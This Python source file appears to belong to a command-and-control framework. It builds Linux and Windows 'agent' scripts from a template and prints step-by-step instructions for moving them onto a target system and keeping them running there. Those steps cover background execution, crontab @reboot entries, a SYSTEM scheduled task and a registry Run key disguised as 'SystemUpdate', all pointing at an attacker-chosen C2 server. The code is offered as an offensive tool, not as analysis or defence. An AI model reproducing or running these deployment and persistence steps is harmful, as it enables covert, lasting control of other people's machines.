import os
import shutil
from datetime import datetime

class AgentGenerator:
    def __init__(self, output_dir='generated_agents'):
        self.output_dir = output_dir
        self.template_path = 'agents/agent_template.py'
        
        # Create output directory if it doesn't exist
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
    
    def generate_agent(self, platform='linux', c2_server='http://localhost:5000'):
        """Generate an agent for specified platform"""
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if platform.lower() == 'windows':
            agent_name = f'agent_windows_{timestamp}.py'
            instructions = self._generate_windows_instructions(agent_name, c2_server)
        else:
            agent_name = f'agent_linux_{timestamp}.py'
            instructions = self._generate_linux_instructions(agent_name, c2_server)
        
        # Copy template to generated agents directory
        output_path = os.path.join(self.output_dir, agent_name)
        
        # Read template
        with open(self.template_path, 'r') as f:
            agent_code = f.read()
        
        # Write to output
        with open(output_path, 'w') as f:
            f.write(agent_code)
        
        # Copy modules directory
        modules_src = 'modules'
        modules_dst = os.path.join(self.output_dir, 'modules')
        
        if os.path.exists(modules_dst):
            shutil.rmtree(modules_dst)
        shutil.copytree(modules_src, modules_dst)
        
        # Create requirements file
        requirements_path = os.path.join(self.output_dir, 'requirements.txt')
        with open(requirements_path, 'w') as f:
            f.write('requests>=2.31.0\n')
        
        return {
            'agent_path': output_path,
            'platform': platform,
            'instructions': instructions,
            'modules_path': modules_dst,
            'requirements_path': requirements_path
        }
    
    def _generate_linux_instructions(self, agent_name, c2_server):
        """Generate Linux deployment instructions"""
        return f"""
Linux Agent Deployment Instructions
====================================

1. Transfer files to target system:
   - {agent_name}
   - modules/ directory
   - requirements.txt

2. Install dependencies:
   $ pip3 install -r requirements.txt

3. Run the agent:
   $ python3 {agent_name} {c2_server}

4. Run in background (optional):
   $ nohup python3 {agent_name} {c2_server} > /dev/null 2>&1 &

5. Make persistent (optional):
   Add to crontab:
   $ (crontab -l 2>/dev/null; echo "@reboot python3 /path/to/{agent_name} {c2_server}") | crontab -

Note: Ensure the C2 server URL is accessible from the target system.
"""
    
    def _generate_windows_instructions(self, agent_name, c2_server):
        """Generate Windows deployment instructions"""
        return f"""
Windows Agent Deployment Instructions
======================================

1. Transfer files to target system:
   - {agent_name}
   - modules\\ directory
   - requirements.txt

2. Install dependencies:
   > pip install -r requirements.txt

3. Run the agent:
   > python {agent_name} {c2_server}

4. Run in background (optional):
   > start /B python {agent_name} {c2_server}

5. Make persistent (optional):
   Create a scheduled task:
   > schtasks /create /tn "SystemUpdate" /tr "python C:\\path\\to\\{agent_name} {c2_server}" /sc onlogon /ru System

   Or add to registry Run key:
   > reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "python C:\\path\\to\\{agent_name} {c2_server}" /f

Note: Ensure the C2 server URL is accessible from the target system.
"""

def main():
    """CLI for agent generation"""
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python agent_generator.py <platform> <c2_server>")
        print("Example: python agent_generator.py linux http://192.168.1.100:5000")
        print("Example: python agent_generator.py windows http://192.168.1.100:5000")
        sys.exit(1)
    
    platform = sys.argv[1]
    c2_server = sys.argv[2]
    
    generator = AgentGenerator()
    result = generator.generate_agent(platform, c2_server)
    
    print(f"\n[+] Agent generated successfully!")
    print(f"[+] Platform: {result['platform']}")
    print(f"[+] Agent file: {result['agent_path']}")
    print(f"[+] Modules: {result['modules_path']}")
    print(f"[+] Requirements: {result['requirements_path']}")
    print(f"\n{result['instructions']}")

if __name__ == '__main__':
    main()
